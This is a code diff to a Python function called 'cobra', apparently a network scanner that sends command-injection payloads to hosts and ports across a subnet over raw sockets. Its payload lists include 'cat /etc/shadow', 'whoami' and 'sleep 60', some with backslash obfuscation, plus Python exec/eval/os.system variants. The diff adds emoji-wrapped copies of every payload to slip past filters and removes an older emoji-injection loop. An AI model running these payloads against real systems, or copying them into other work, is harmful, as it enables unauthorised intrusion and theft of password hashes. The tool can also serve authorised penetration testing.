@@ -12,8 +12,17 @@ RED = "\033[1;31m"
 def cobra(host,delay=0):
     hits = []
 
+    emojis = ["\U0001F600",
+             "\U0001F47C",
+             "\U0001F525"]
+
     mal_command = [r"sleep 60",
                    r"sleep \6\0"]
+
+    init_mal_command = mal_command[:]
+    for mal in init_mal_command:
+        for emoji in emojis:
+            mal_command.append(emoji + mal + emoji)
 
     mal_command_enumerate = [r"cat /etc/shadow",
                              r"cat \/\e\t\c/\s\h\ad\o\w",
@@ -24,9 +33,10 @@ def cobra(host,delay=0):
                              r"whoami",
                              r"\w\h\o\a\m\i"]
 
-    mal_emoji = ["\U0001F600",
-                 "\U0001F47C",
-                 "\U0001F525"]
+    init_mal_command_enumerate = mal_command_enumerate[:]
+    for mal in init_mal_command_enumerate:
+        for emoji in emojis:
+            mal_command_enumerate.append(emoji + mal + emoji)
 
     mal_python = [r"time.sleep(60)",
                   r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))",
@@ -39,6 +49,11 @@ def cobra(host,delay=0):
                   r'exec("__import__(\'os\').system(\'sleep 60\')")',
                   r'exec("import time\ntime.sleep(60)"',
                   r'exec("import os\nos.system(\'sleep 60\')")']
+
+    init_mal_python = mal_python[:]
+    for mal in init_mal_python:
+        for emoji in emojis:
+            mal_python.append(emoji + mal + emoji)
 
     mal_python_enumerate = [r"eval(compile('import os\nos.system('cat /etc/shadow')','cobra','exec'))",
                             r"eval(compile('import os\nos.system('cat \/\e\t\c/\s\h\ad\o\w')','cobra','exec'))",
@@ -81,7 +96,11 @@ def cobra(host,delay=0):
                             r'exec("import os\nos.system(\'whoami\')")',
                             r'exec("import os\nos.system(\'\w\h\o\a\m\i\')")']
 
-
+    init_mal_python_enumerate = mal_python_enumerate[:]
+    for mal in init_mal_python_enumerate:
+        for emoji in emojis:
+            mal_python_enumerate.append(emoji + mal + emoji)
+    
     clear()
     
     # subnet
@@ -115,22 +134,6 @@ def cobra(host,delay=0):
                                         hits.append(f"command injection in {ip}:{port} (payload: {mal_enum})- {data}")
 
                         tcp_socket.close()
-
-                    except:
-                        pass
-
-                for mal in mal_emoji:
-                    time.sleep(delay)
-                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    tcp_socket.settimeout(15)
-                    try:
-                        tcp_socket.connect((host, port))
-                        tcp_socket.send(mal.encode())
-                        data = tcp_socket.recv(65535)
-                        tcp_socket.close()
-                        if len(data) > 0:
-                            if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                                hits.append(f"emoji injection in {ip}:{port} (payload: {mal})- {data}")
 
                     except:
                         pass
@@ -186,22 +189,6 @@ def cobra(host,delay=0):
                                     hits.append(f"command injection in port {port}:{mal_enum}- {data}")
 
                     tcp_socket.close()
-
-                except:
-                    pass
-
-            for mal in mal_emoji:
-                time.sleep(delay)
-                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                tcp_socket.settimeout(15)
-                try:
-                    tcp_socket.connect((host, port))
-                    tcp_socket.send(mal.encode())
-                    data = tcp_socket.recv(65535)
-                    tcp_socket.close()
-                    if len(data) > 0:
-                        if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                            hits.append(f"emoji injection in port {port}:{mal}- {data}")
 
                 except:
                     pass
